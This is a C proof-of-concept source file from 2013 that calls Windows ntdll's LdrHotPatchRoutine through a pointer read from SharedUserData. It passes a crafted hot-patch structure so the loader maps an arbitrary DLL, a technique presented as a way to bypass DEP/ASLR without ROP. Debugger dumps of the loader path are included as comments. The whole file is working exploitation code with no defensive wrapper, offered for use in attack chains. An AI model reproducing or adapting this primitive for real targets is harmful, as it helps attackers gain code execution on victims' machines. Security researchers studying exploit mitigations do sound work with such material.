/*

    LdrHotPatchRoutine.c - Play with the brand "new" way to bypass DEP/ASLR without ROP
    Copyright (C) 2013 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


    See the talk of @tombkeeper (CanSecWest 2013):
        http://www.garage4hackers.com/blogs/8/dep-aslr-bypass-without-rop-jit-cansecwest2013-slides-analysis-785/
*/
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

#define DLL_PATCHER_NAME (L"testing.dll")
#define DLL_PATCHER_NAME_SIZE (wcslen(DLL_PATCHER_NAME) * 2)

#define DLL_PATCHEE_NAME (L"kernel32.dll")
#define DLL_PATCHEE_NAME_SIZE (wcslen(DLL_PATCHEE_NAME) * 2)

typedef struct
{
    ULONG o1;
    ULONG o2;

    USHORT PatcherNameOffset;
    USHORT PatcherNameLen;

    USHORT PatcheeNameOffset;
    USHORT PatcheeNameLen;

    USHORT UnknowNameOffset;
    USHORT UnknowNameLen;
} HOTPATCH;

typedef struct
{
    HOTPATCH a;
    WCHAR PatcherName[100];
    WCHAR PatcheeName[100];
} MYHOTPATCH;

typedef DWORD (*LdrHotPatchRoutine_t)(MYHOTPATCH*);

int main()
{
    MYHOTPATCH hotpatch = {0};
    LdrHotPatchRoutine_t LdrHotPatchRoutine = NULL;

    LdrHotPatchRoutine = (LdrHotPatchRoutine_t)(*(PDWORD)(0x7ffe0000 + 0x340 + 4*4));
    printf("ntdll.LdrHotPatchRoutine is at : %.8x\n", LdrHotPatchRoutine);

    /*
        Address   Hex dump          Command                                                                     Comments
        7784FC44    F700 00000020   TEST DWORD PTR [EAX],20000000
        7784FC4A    0F84 7F020000   JE ntdll.7784FECF ; Exit the function
    */
    hotpatch.a.o1 = (0xdeadbeef | 0x20000000);

    wcscpy(hotpatch.PatcherName, DLL_PATCHER_NAME);
    hotpatch.a.PatcherNameOffset = sizeof(HOTPATCH);
    // God, special thanks to @net__ninja (https://net-ninja.net/) bro who helped me to find that ******* typo #@!
    hotpatch.a.PatcherNameLen = DLL_PATCHER_NAME_SIZE;

    wcscpy(hotpatch.PatcheeName, DLL_PATCHEE_NAME);
    hotpatch.a.PatcheeNameOffset = sizeof(HOTPATCH) + sizeof(hotpatch.PatcherName);
    hotpatch.a.PatcheeNameLen = DLL_PATCHEE_NAME_SIZE;

    /* If you want to step in LdrHotPatchRoutine */
    __asm__("int3;");

    /*
        Address   Hex dump          Command                                                                     Comments
        7784FD50    E8 05C7F9FF     CALL ntdll.LdrLoadDll

        On the stack:
            CPU Stack
            Address   Value      ASCII Comments
            0028FCB4  /00000000  ....
            0028FCB8  |00000000  ....
            0028FCBC  |0028FCFC  üü(.
            0028FCC0  |0028FD20   ý(.

        UNICODE_STRING at 0028FCBC:
            Address   Hex dump                                         ASCII
            0028FCFC  00 00 00 00|7C FD 28 00|                         ....|ý(.

            0028FD7C -> the PATCHER_NAME
        w00tz our dllz loaded!
    */
    LdrHotPatchRoutine(&hotpatch);

    printf("done\n");
    return EXIT_SUCCESS;
}
